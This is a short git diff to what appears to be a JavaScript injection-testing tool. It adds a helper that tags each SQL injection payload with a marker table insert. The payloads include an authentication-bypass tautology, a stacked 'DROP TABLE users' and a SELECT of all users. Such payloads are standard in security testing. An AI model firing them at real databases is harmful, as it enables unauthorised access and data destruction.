@@ -50,16 +50,19 @@ $(document).ready(function() {
   }
 
   /* Basic SQL */
+  var sql_debug = function(name) {
+    return "CREATE TABLE sql_vuln IF NOT EXISTS (field VARCHAR); INSERT INTO sql_vuln VALUES('"+name+"');"; 
+  }
   attacks[1][0] = function(name) {
-    return "' or '1'='1' -- '";
+    return "' or '1'='1' -- '" + sql_debug(name);
   }
 
   attacks[1][1] = function(name) {
-    return "a';DROP TABLE users;";
+    return "a';DROP TABLE users;" + sql_debug(name);
   }
 
   attacks[1][2] = function(name) {
-    return "a’;SELECT * FROM users WHERE 't' = 't';";
+    return "a’;SELECT * FROM users WHERE 't' = 't';" + sql_debug(name);
   }
 
   /* Basic XSS */
